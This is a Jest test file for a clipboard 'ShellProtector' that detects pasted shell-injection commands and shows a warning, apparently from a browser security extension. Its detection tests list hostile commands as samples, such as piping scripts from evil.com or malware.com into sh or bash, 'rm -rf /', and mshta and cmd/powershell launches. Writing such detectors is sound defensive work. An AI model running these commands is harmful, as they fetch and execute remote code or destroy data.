import { ShellProtector } from '../content-shell';
import { displayShellInjectionNotification } from '../content-notifications.js';


jest.mock('../content-notifications.js');

const mockDisplayShellInjectionNotification = displayShellInjectionNotification as jest.MockedFunction<typeof displayShellInjectionNotification>;

// Mock console methods to avoid test output noise
const consoleSpy = {
  debug: jest.spyOn(console, 'debug').mockImplementation(),
  warn: jest.spyOn(console, 'warn').mockImplementation(),
  error: jest.spyOn(console, 'error').mockImplementation()
};

describe('ShellProtector', () => {
  beforeEach(() => {
    jest.clearAllMocks();

    // Reset static properties
    (ShellProtector as any).isActive = true;
    (ShellProtector as any).clipboardPermissionCache = null;

    // Mock window.location
    Object.defineProperty(window, 'location', {
      value: { href: 'https://example.com/test' },
      writable: true,
      configurable: true
    });

    // mockUrlHost.mockReturnValue('example.com');

    // Mock document methods
    Object.defineProperty(document, 'execCommand', {
      value: jest.fn().mockReturnValue(true),
      writable: true
    });

    Object.defineProperty(document, 'getElementById', {
      value: jest.fn(),
      writable: true
    });

    Object.defineProperty(document, 'addEventListener', {
      value: jest.fn(),
      writable: true
    });

    Object.defineProperty(document, 'createElement', {
      value: jest.fn(),
      writable: true
    });

    // Mock document.body
    Object.defineProperty(document, 'body', {
      value: {
        appendChild: jest.fn(),
        removeChild: jest.fn()
      },
      writable: true
    });


  });

  afterEach(() => {
    Object.values(consoleSpy).forEach(spy => spy.mockClear());
  });

  describe('attachEvents', () => {
    it('should attach click events to disable warning buttons', () => {
      const mockButton1 = { addEventListener: jest.fn() };
      const mockButton2 = { addEventListener: jest.fn() };
      const mockDocument = {
        getElementById: jest.fn()
          .mockReturnValueOnce(mockButton1)
          .mockReturnValueOnce(mockButton2)
      };

      ShellProtector.attachEvents(mockDocument as any);

      expect(mockDocument.getElementById).toHaveBeenCalledWith("mb-disable-shell-warning");
      expect(mockDocument.getElementById).toHaveBeenCalledWith("mb-disable-search-hijacking-warning");
      expect(mockButton1.addEventListener).toHaveBeenCalledWith("click", expect.any(Function));
      expect(mockButton2.addEventListener).toHaveBeenCalledWith("click", expect.any(Function));
    });

    it('should handle missing buttons gracefully', () => {
      const mockDocument = {
        getElementById: jest.fn().mockReturnValue(null)
      };

      expect(() => ShellProtector.attachEvents(mockDocument as any)).not.toThrow();
    });

  });

  describe('isSuspiciousText', () => {
    it('should detect command chaining with semicolon', () => {
      expect(ShellProtector.isSuspiciousText('ls -la; rm -rf /')).toBe(true);
    });

    it('should detect pipe commands', () => {
      expect(ShellProtector.isSuspiciousText('curl http://evil.com/script.sh | sh')).toBe(true);
      expect(ShellProtector.isSuspiciousText('wget -O- http://malware.com | bash')).toBe(true);
    });

    it('should detect command substitution', () => {
      expect(ShellProtector.isSuspiciousText('$(ls -la)')).toBe(true);
    });

    it('should detect suspicious shell keywords', () => {
      expect(ShellProtector.isSuspiciousText('curl http://example.com')).toBe(true);
      expect(ShellProtector.isSuspiciousText('rm -rf /important/files')).toBe(true);
      expect(ShellProtector.isSuspiciousText('wget malicious-file.exe')).toBe(true);
      expect(ShellProtector.isSuspiciousText('mshta http://evil.com/script.hta')).toBe(true);
    });

    it('should detect Windows cmd patterns', () => {
      expect(ShellProtector.isSuspiciousText('cmd /c start powershell')).toBe(true);
      expect(ShellProtector.isSuspiciousText('cmd /c start /min powershell')).toBe(true);
      expect(ShellProtector.isSuspiciousText('cmd /C java speedboost')).toBe(true);
      expect(ShellProtector.isSuspiciousText('cmd /K java ronan')).toBe(true);
    });

    it('should return false for safe text', () => {
      expect(ShellProtector.isSuspiciousText('Hello world')).toBe(false);
      expect(ShellProtector.isSuspiciousText('This is normal text')).toBe(false);
      expect(ShellProtector.isSuspiciousText('user@example.com')).toBe(false);
      expect(ShellProtector.isSuspiciousText("no it's Becky")).toBe(false);
      expect(ShellProtector.isSuspiciousText('Eeemotionaaal Damaage')).toBe(false);
      expect(ShellProtector.isSuspiciousText("Look at me, I'm the captain now")).toBe(false);
      expect(ShellProtector.isSuspiciousText('FIFTY BAR V2 DISPOSABLE | 20000 PUFFS')).toBe(false);
      expect(ShellProtector.isSuspiciousText('curl my hair becky')).toBe(false);
      expect(ShellProtector.isSuspiciousText('echo echo echo!!')).toBe(false);
      expect(ShellProtector.isSuspiciousText('echo echo echo; buy an amazon echo!!')).toBe(false);
      expect(ShellProtector.isSuspiciousText('you tink; okay that\'s cool')).toBe(false);
      expect(ShellProtector.isSuspiciousText('lsp is a great progamming language, and splet wrong')).toBe(false);
      expect(ShellProtector.isSuspiciousText('rmi records is my favorite record company')).toBe(false);
      expect(ShellProtector.isSuspiciousText('cpu usage is good')).toBe(false);
      expect(ShellProtector.isSuspiciousText('mvmt watches are stupi9d')).toBe(false);
      expect(ShellProtector.isSuspiciousText('touch him. like diddy? gross!')).toBe(false);
      expect(ShellProtector.isSuspiciousText('cd is coming back as a format Dave!')).toBe(false);
      expect(ShellProtector.isSuspiciousText('wgetting is a common way to get files')).toBe(false);
      expect(ShellProtector.isSuspiciousText('cmd is used on windows machines')).toBe(false);
      expect(ShellProtector.isSuspiciousText('mshta executes html applications')).toBe(false);
      expect(ShellProtector.isSuspiciousText('grep it, not grope it')).toBe(false);
    });
  });

  describe('getClipboardContent', () => {
    beforeEach(() => {
      // Reset navigator.clipboard for each test
      Object.defineProperty(navigator, 'clipboard', {
        value: undefined,
        writable: true,
        configurable: true
      });
    });

    it('should return text from clipboard event data', async () => {
      const mockEvent = {
        clipboardData: {
          getData: jest.fn().mockReturnValue('test clipboard text')
        }
      } as unknown as ClipboardEvent;

      const result = await ShellProtector.getClipboardContent(mockEvent);
      expect(result).toBe('test clipboard text');
    });
  });

  describe('injectWarning', () => {
    it('should call displayShellInjectionNotification with attachEvents', () => {
      ShellProtector.injectWarning();
      expect(mockDisplayShellInjectionNotification).toHaveBeenCalledWith(ShellProtector.attachEvents);
    });
  });
});
